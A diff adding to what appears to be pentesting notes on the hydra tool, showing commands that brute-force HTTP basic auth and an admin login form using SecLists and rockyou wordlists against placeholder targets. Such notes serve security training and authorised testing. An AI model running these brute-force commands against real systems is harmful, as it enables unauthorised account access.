@@ -12,3 +12,8 @@ For the purpose of attacking HTTP basic auth, type :
  hydra -L /opt/useful/SecLists/Usernames/Names/usernames.txt -p /usr/share/SecLists/Passwords/Default-Credentials/default-passwords.txt -u -f SERVER_IP -s SERVER_PORT http-get /
 
  ```
+ In order to attack some page wich contains form, you must use the **http-post-form** module of hydra. There's an example :
+```
+ sudo hydra -l admin -P /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt -f $ip -s $port http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
+
+```
